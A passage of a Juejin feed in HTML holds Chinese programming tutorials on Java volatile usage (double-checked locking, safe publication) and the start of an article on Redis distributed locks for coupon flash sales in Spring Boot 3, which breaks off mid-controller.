    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">stopRequested</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">someState</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 一个普通的非volatile变量</span>

    <span class="hljs-comment">// 工作线程</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">Thread</span> <span class="hljs-variable">workerThread</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
        <span class="hljs-keyword">while</span> (!stopRequested) { <span class="hljs-comment">// 【 volatile 读 】- 这里建立了hb关系</span>
            <span class="hljs-comment">// 模拟工作：读取或修改 someState</span>
            someState++;
            <span class="hljs-keyword">try</span> {
                Thread.sleep(<span class="hljs-number">100</span>);
            } <span class="hljs-keyword">catch</span> (InterruptedException ignored) {}
        }
        <span class="hljs-comment">// 循环结束后，能看到主线程在设置stopRequested=true之前修改的所有状态</span>
        System.out.println(<span class="hljs-string">"Worker stopped. Final state: "</span> + someState);
    });

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
        workerThread.start();
    }

    <span class="hljs-comment">// 主线程调用此方法请求停止</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. 主线程可以在此更新一些最终状态（例如保存进度）</span>
        someState = <span class="hljs-number">100</span>; <span class="hljs-comment">// 普通写</span>
        <span class="hljs-comment">// 2. 【关键 volatile 写 】</span>
        stopRequested = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 这个写操作与workerThread的读操作建立happens-before</span>
        System.out.println(<span class="hljs-string">"Stop requested sent."</span>);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">Example</span> <span class="hljs-variable">example</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Example</span>();
        example.start();
        Thread.sleep(<span class="hljs-number">1000</span>); <span class="hljs-comment">// 让工作线程运行1秒</span>
        example.stop(); <span class="hljs-comment">// 发送停止信号</span>
        example.workerThread.join(); <span class="hljs-comment">// 等待工作线程结束</span>
    }
}
</code></pre>
<p><strong>2.双重检查锁定单例模式</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Singleton</span> {
    <span class="hljs-comment">// 关键：instance必须声明为volatile</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">volatile</span> Singleton instance;
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Config config;
    
    <span class="hljs-keyword">private</span> <span class="hljs-title function_">Singleton</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 这是一个昂贵的初始化过程</span>
        <span class="hljs-built_in">this</span>.config = loadConfigFromDB(); <span class="hljs-comment">// 假设此操作很耗时</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Singleton <span class="hljs-title function_">getInstance</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {                     <span class="hljs-comment">// 第一次检查（无锁，性能关键）</span>
            <span class="hljs-keyword">synchronized</span> (Singleton.class) {        <span class="hljs-comment">// 加锁</span>
                <span class="hljs-keyword">if</span> (instance == <span class="hljs-literal">null</span>) {             <span class="hljs-comment">// 第二次检查（防止重复创建）</span>
                    <span class="hljs-comment">// 非原子操作：1.分配内存 2.调用构造函数 3.将引用赋给instance</span>
                    <span class="hljs-comment">// 如果没有volatile，步骤2和3可能被重排序，导致其他线程看到未初始化完的对象（config为null）</span>
                    instance = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Singleton</span>();
                }
            }
        }
        <span class="hljs-keyword">return</span> instance;
    }
    
    <span class="hljs-keyword">public</span> Config <span class="hljs-title function_">getConfig</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> config; }
}
</code></pre>
<hr/>
<p><strong>双重检查锁定单例中，为什么instance变量必须用volatile修饰？</strong></p>
<p><code>synchronized</code>保证同一时刻只有一个线程执行实例化代码块，但无法阻止JVM或CPU优化导致的指令重排序。</p>
<p><code>instance = new Singleton()</code>在JVM层面分三步：</p>
<ol>
<li>分配内存空间</li>
<li>初始化对象</li>
<li>将引用指向内存地址</li>
</ol>
<p><strong>没有volatile时可能发生的问题</strong>：</p>
<ol>
<li>线程A执行创建，JVM可能先执行步骤3（引用指向内存），但还未执行步骤2（初始化对象）</li>
<li>此时instance已不是null，但指向的是未初始化完成的半成品对象</li>
<li>线程B执行第一次检查，发现instance不是null，直接返回这个半成品对象</li>
<li>线程B使用这个对象时出错</li>
</ol>
<p><strong>volatile的关键作用</strong>：</p>
<ul>
<li><strong>禁止指令重排序</strong>：强制保证步骤2在步骤3之前执行</li>
<li><strong>保证可见性</strong>：线程A对instance的完整写入能立即被线程B看到</li>
</ul>
<hr/>
<h4 data-id="heading-5">2. 一次性状态发布</h4>
<p>当一个对象构造完成后，其状态不再改变，但需要被多个线程安全地访问。<code>volatile</code>提供了比<code>synchronized</code>更轻量级的发布方式。</p>
<p>java</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EventRouter</span> {
    <span class="hljs-comment">// 保存全局路由配置，启动后加载一次，之后只读。</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> Map&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; routeConfig;
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span> </span>{
        <span class="hljs-comment">// 在单线程中完成所有复杂的、耗时的初始化</span>
        Map&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; config = <span class="hljs-built_in">heavyWeightInitialization</span>();
        <span class="hljs-comment">// 全部完成后，一次性volatile写入，对所有线程立即可见</span>
        <span class="hljs-keyword">this</span>.routeConfig = config; <span class="hljs-comment">// volatile写</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">String</span> <span class="hljs-title">getRoute</span><span class="hljs-params">(<span class="hljs-type">String</span> event)</span> </span>{
        <span class="hljs-comment">// 多线程并发读：volatile读，能立刻看到init线程写入的所有routeConfig内容</span>
        Map&lt;<span class="hljs-type">String</span>, <span class="hljs-type">String</span>&gt; config = <span class="hljs-keyword">this</span>.routeConfig; <span class="hljs-comment">// volatile读</span>
        <span class="hljs-keyword">return</span> config.<span class="hljs-built_in">get</span>(event);
    }
}
</code></pre>
<p><strong>最佳实践</strong>：配合<strong>不可变对象</strong>（如<code>Collections.unmodifiableMap</code>包装的Map）使用，效果最佳。因为发布后状态不可变，读线程无需同步。</p>
<h4 data-id="heading-6">3. 低成本读写锁（读多写少）</h4>
<p>在某些读远多于写、且写操作非常简单的场景，可以用<code>volatile</code>变量配合CAS（如<code>AtomicInteger</code>）模拟一个更轻量的读写锁。</p>
<p>java</p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">LightweightCoordinator</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-built_in">int</span> epoch = <span class="hljs-number">0</span>; <span class="hljs-comment">// “纪元”版本号</span>
    <span class="hljs-keyword">private</span> final AtomicInteger writeLock = <span class="hljs-keyword">new</span> AtomicInteger(<span class="hljs-number">0</span>);
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beginRead</span>()</span> {
        <span class="hljs-built_in">int</span> snapshotEpoch;
        <span class="hljs-keyword">do</span> {
            snapshotEpoch = epoch; <span class="hljs-comment">// volatile读，获取当前“稳定”版本</span>
            <span class="hljs-comment">// 检查是否有写操作正在进行（通过CAS状态判断，此处简化）</span>
        } <span class="hljs-keyword">while</span> (isWritingInProgress()); <span class="hljs-comment">// 如果正在写，则重试</span>
        <span class="hljs-comment">// 后续读操作基于snapshotEpoch进行</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">endRead</span>()</span> {
        <span class="hljs-comment">// 通常无需操作</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">beginWrite</span>()</span> {
        <span class="hljs-comment">// 通过CAS获取写锁</span>
        <span class="hljs-keyword">while</span> (!writeLock.compareAndSet(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)) {
            <span class="hljs-comment">// 自旋或后退</span>
        }
        epoch++; <span class="hljs-comment">// volatile写，递增纪元，强制所有读线程在下一次读取时看到新数据</span>
        <span class="hljs-comment">// ... 执行写操作</span>
    }
    
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">endWrite</span>()</span> {
        writeLock.<span class="hljs-keyword">set</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 释放写锁</span>
    }
}
</code></pre>
<p><strong>注意</strong>：这是一种高级模式，仅适用于写操作极快、读操作可以容忍短暂重试的场景。多数情况下，应直接使用<code>ReentrantReadWriteLock</code>或<code>StampedLock</code>。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Spring Boot3 中结合Redis实现分布式锁机制实现并发抢券]]></title>    <link>https://juejin.cn/post/7581870491763474484</link>    <guid>https://juejin.cn/post/7581870491763474484</guid>    <pubDate>2025-12-10T05:26:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581870491763474484" data-draft-id="7581870491763458100" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Spring Boot3 中结合Redis实现分布式锁机制实现并发抢券"/> <meta itemprop="keywords" content="后端,Java,程序员"/> <meta itemprop="datePublished" content="2025-12-10T05:26:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员西西"/> <meta itemprop="url" content="https://juejin.cn/user/326976944214804"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Spring Boot3 中结合Redis实现分布式锁机制实现并发抢券
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/326976944214804/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员西西
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T05:26:57.000Z" title="Wed Dec 10 2025 05:26:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>在当今互联网软件开发领域，随着业务规模的不断扩大和用户数量的急剧增长，高并发场景愈发常见。其中，抢券活动因其能够有效吸引用户参与、提升业务活跃度，成为众多互联网应用的热门功能。然而，在高并发环境下实现抢券逻辑，面临着诸多挑战，尤其是如何确保数据的一致性和避免超卖问题。Spring Boot3 作为一款强大的后端开发框架，结合 Redis 这一高性能的内存数据库，为我们提供了实现分布式锁机制的有效途径，从而保障抢券逻辑的正确执行。本文将深入探讨在 Spring Boot3 中如何利用 Redis 实现分布式锁机制来达成抢券逻辑，并全面解决抢券逻辑中可能出现的各类问题。</p>
<h2 data-id="heading-1">高并发抢券场景的挑战</h2>
<p>以常见的电商平台为例，在促销活动期间，平台发放的优惠券数量有限，而参与抢券的用户可能达到百万甚至千万级别。瞬间产生的高并发请求，对系统的稳定性和性能无疑是巨大的考验。传统的单体应用架构在这种高并发场景下往往力不从心，因为单体应用的资源和处理能力有限，难以应对海量的并发请求。此外，在分布式系统中，多个服务实例并行运行，如何确保它们对共享资源（如优惠券库存）的访问是安全且高效的，成为了亟待解决的问题。</p>
<p>在抢券场景中，最核心的问题便是超卖现象的出现。当多个用户同时请求抢券时，如果系统没有采取有效的并发控制措施，就可能出现多个用户同时查询到有券，都去进行扣减，导致库存出现负数的情况。这不仅会给企业带来经济损失，还会严重影响用户体验，损害企业的声誉。因此，实现一个可靠的分布式锁机制，成为解决高并发抢券问题的关键所在。</p>
<h2 data-id="heading-2">Redis 分布式锁基础</h2>
<p><strong>（一）Redis 简介</strong></p>
<p>Redis 是一个开源的、基于内存的数据结构存储系统，它支持多种数据结构，如字符串（string）、哈希（hash）、列表（list）、集合（set）和有序集合（sorted set）等。Redis 以其高性能、低延迟和丰富的数据结构操作命令，成为了分布式系统中缓存、消息队列、分布式锁等功能的首选技术之一。在分布式锁场景中，Redis 主要利用其原子操作和内存存储的特性，实现高效的锁机制。</p>
<p><strong>（二）基于 Redis 实现分布式锁的基本原理</strong></p>
<p>Redis 分布式锁的基本原理是利用 Redis 的原子操作来实现锁的获取和释放。具体来说，当一个客户端尝试获取锁时，它会向 Redis 发送一个 SET 命令，利用 SET 命令的 NX（即 “不存在则设置”）参数，只有当锁对应的键不存在时，SET 操作才会成功，从而表示该客户端成功获取到了锁。同时，为了避免锁一直被持有而导致死锁，我们还会为锁设置一个过期时间，通过 SET 命令的 EX（即 “过期时间”）参数来指定。例如，以下是使用 Jedis（一个常用的 Redis Java 客户端）实现获取锁的代码示例：</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title">tryGetLock</span><span class="hljs-params">(Jedis jedis, <span class="hljs-type">String</span> lockKey, <span class="hljs-type">String</span> uniqueValue, <span class="hljs-type">int</span> expireTime)</span> </span>{
    <span class="hljs-type">String</span> result = jedis.<span class="hljs-built_in">set</span>(lockKey, uniqueValue, <span class="hljs-string">"NX"</span>, <span class="hljs-string">"EX"</span>, expireTime);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"OK"</span>.<span class="hljs-built_in">equals</span>(result);
}
</code></pre>
<p>在上述代码中，lockKey 是锁的唯一标识，uniqueValue 是每个请求的唯一值（比如可以用 UUID 生成），用于防止误删锁，expireTime 是锁的过期时间，单位为秒。当一个客户端成功执行 SET 操作返回 “OK” 时，说明它成功获取到了锁；否则，表示获取锁失败。</p>
<p>当客户端完成业务逻辑后，需要释放锁。释放锁的过程则是通过 DEL 命令删除 Redis 中对应的锁键。不过，在释放锁时，需要注意确保只有锁的持有者才能释放锁，否则可能会出现误释放其他线程锁的情况。为了解决这个问题，我们可以在释放锁时，先判断锁对应的值是否与当前客户端持有的唯一值相同，相同时才执行 DEL 操作。这一操作可以通过 Lua 脚本在 Redis 中实现原子性执行，示例代码如下：</p>
<pre><code class="hljs language-vbnet" lang="vbnet"><span class="hljs-keyword">if</span> redis.<span class="hljs-keyword">call</span>(<span class="hljs-comment">'GET', KEYS[1]) == ARGV[1] then</span>
    <span class="hljs-keyword">return</span> redis.<span class="hljs-keyword">call</span>(<span class="hljs-comment">'DEL', KEYS[1])</span>
<span class="hljs-keyword">else</span>
    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
<span class="hljs-keyword">end</span>
</code></pre>
<p>在 Java 中调用该 Lua 脚本释放锁的代码如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">releaseLock</span>(<span class="hljs-params">Jedis jedis, <span class="hljs-built_in">String</span> lockKey, <span class="hljs-built_in">String</span> uniqueValue</span>) {
    <span class="hljs-title class_">String</span> script = <span class="hljs-string">"if redis.call('GET', KEYS[1]) == ARGV[1] then return redis.call('DEL', KEYS[1]) else return 0 end"</span>;
    jedis.<span class="hljs-built_in">eval</span>(script, <span class="hljs-title class_">Collections</span>.<span class="hljs-title function_">singletonList</span>(lockKey), <span class="hljs-title class_">Collections</span>.<span class="hljs-title function_">singletonList</span>(uniqueValue));
}
</code></pre>
<p>通过上述方式，我们实现了一个基本的 Redis 分布式锁，能够在一定程度上满足高并发场景下对共享资源的并发控制需求。</p>
<h2 data-id="heading-3">Spring Boot3 中集成 Redis 实现分布式锁</h2>
<p><strong>（一）引入 Redis 依赖</strong></p>
<p>在 Spring Boot3 项目中，首先需要在 pom.xml 文件中引入 Redis 相关依赖。如果使用 Spring Data Redis 来操作 Redis，可添加如下依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p>此外，如果使用 Jedis 作为 Redis 客户端，还需添加 Jedis 依赖：</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>redis.clients<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jedis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><strong>（二）配置 Redis 连接</strong></p>
<p>在引入依赖后，需要在 application.properties 或 application.yml 文件中配置 Redis 服务器的连接信息。以 application.yml 为例，配置如下：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">spring:</span>
  <span class="hljs-attr">redis:</span>
    <span class="hljs-attr">host:</span> <span class="hljs-string">your-redis-host</span>
    <span class="hljs-attr">port:</span> <span class="hljs-number">6379</span>
    <span class="hljs-attr">password:</span> <span class="hljs-string">your-redis-password</span>
</code></pre>
<p>这里的 your-redis-host 需要替换为实际的 Redis 服务器地址，your-redis-password 替换为实际的密码（如果有设置）。</p>
<p><strong>（三）编写获取锁和释放锁的代码</strong></p>
<p>在 Spring Boot3 项目中，我们可以将获取锁和释放锁的逻辑封装成工具类。以下是一个使用 RedisTemplate（Spring Data Redis 提供的操作 Redis 的核心类）实现获取锁和释放锁的示例：</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.data.redis.core.RedisTemplate;
<span class="hljs-keyword">import</span> org.springframework.data.redis.core.script.DefaultRedisScript;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Component;
<span class="hljs-keyword">import</span> java.util.Collections;
<span class="hljs-keyword">import</span> java.util.concurrent.TimeUnit;

<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisLockUtil</span> {

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">LOCK_SUCCESS</span> <span class="hljs-operator">=</span> <span class="hljs-string">"OK"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SET_IF_NOT_EXIST</span> <span class="hljs-operator">=</span> <span class="hljs-string">"NX"</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SET_WITH_EXPIRE_TIME</span> <span class="hljs-operator">=</span> <span class="hljs-string">"EX"</span>;

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> RedisTemplate&lt;String, String&gt; redisTemplate;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">RedisLockUtil</span><span class="hljs-params">(RedisTemplate&lt;String, String&gt; redisTemplate)</span> {
        <span class="hljs-built_in">this</span>.redisTemplate = redisTemplate;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">tryGetLock</span><span class="hljs-params">(String lockKey, String uniqueValue, <span class="hljs-type">long</span> expireTime, TimeUnit timeUnit)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> redisTemplate.execute((RedisCallback&lt;String&gt;) connection -&gt; {
            <span class="hljs-type">JedisCommands</span> <span class="hljs-variable">commands</span> <span class="hljs-operator">=</span> (JedisCommands) connection.getNativeConnection();
            <span class="hljs-keyword">return</span> commands.set(lockKey, uniqueValue, SET_IF_NOT_EXIST, SET_WITH_EXPIRE_TIME, timeUnit.toSeconds(expireTime));
        });
        <span class="hljs-keyword">return</span> LOCK_SUCCESS.equals(result);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">releaseLock</span><span class="hljs-params">(String lockKey, String uniqueValue)</span> {
        <span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">"if redis.call('GET', KEYS[1]) == ARGV[1] then return redis.call('DEL', KEYS[1]) else return 0 end"</span>;
        redisTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultRedisScript</span>&lt;&gt;(script, Long.class), Collections.singletonList(lockKey), Collections.singletonList(uniqueValue));
    }
}
</code></pre>
<p>在上述代码中，tryGetLock 方法尝试获取锁，通过 RedisTemplate 的 execute 方法执行原生的 Jedis 命令，利用 SET 命令结合 NX 和 EX 参数来实现锁的获取。releaseLock 方法则通过执行 Lua 脚本，确保只有锁的持有者才能成功释放锁。</p>
<p><strong>（四）在抢券业务中应用分布式锁</strong></p>
<p>在抢券业务逻辑中，我们可以使用上述封装的 RedisLockUtil 来实现分布式锁。假设我们有一个抢券的 Controller 方法，示例代码如下：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">beans</span>.<span class="hljs-property">factory</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">Autowired</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">GetMapping</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">PathVariable</span>;
<span class="hljs-keyword">import</span> org.<span class="hljs-property">springframework</span>.<span class="hljs-property">web</span>.<span class="hljs-property">bind</span>.<span class="hljs-property">annotation</span>.<span class="hljs-property">RestController</span>;

<span class="hljs-keyword">import</span> java.<span class="hljs-property">util</span>.<span class="hljs-property">UUID</span>;

<span class="hljs-meta">@RestController</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CouponController</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">RedisLockUtil</span> redisLockUtil;

    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/coupon/seckill/{couponId}"</span>)
